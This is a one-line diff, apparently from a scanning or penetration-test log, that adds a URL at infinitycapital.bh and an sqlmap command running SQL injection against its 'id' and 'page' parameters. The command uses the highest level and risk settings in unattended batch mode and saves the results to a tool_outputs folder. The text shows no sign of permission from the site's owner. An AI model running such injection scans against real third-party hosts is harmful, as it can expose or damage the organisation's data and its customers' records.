@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/api/?id=1&page=2 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/?id=1&page=2 -p id,page --batch --level=5 --risk=3 --output-dir=tool_outputs/d13inj
